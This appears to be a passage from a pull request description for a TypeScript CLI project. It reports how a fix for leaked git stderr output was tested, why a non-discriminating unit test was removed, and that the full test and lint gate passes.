CLI-level test (`apps/cli/src/cli.test.ts`, spawning the real compiled
binary on a repo without `AGENTS.md`, asserting no `fatal:`/`AGENTS.md` in
its stderr) was verified with the full stash/revert cycle — fails pre-fix
with the exact leaked line, passes post-fix. A second, unit-level isolation
test in a new `packages/git/src/git-exec.test.ts` tried to prove the same
thing via a doubly-nested child process (spawning a `node -e` script that
itself spawns `git`), and **did not actually discriminate** — it passed
identically pre-fix and post-fix, most likely because the grandchild's
stderr-forwarding target resolves differently once already inside a spawned
process. Rather than ship a test that would pass either way — this project's
own stated worse-than-no-test case — it was removed, with the reasoning left
in a comment pointing at the CLI-level test that does discriminate.
`git-exec.ts` had no test file at all before this; the four surviving unit
tests are new, real coverage of the wrapper regardless.

725 tests (up from 720). Full gate clean: `tsc -b`, `eslint .`, `vitest run`.
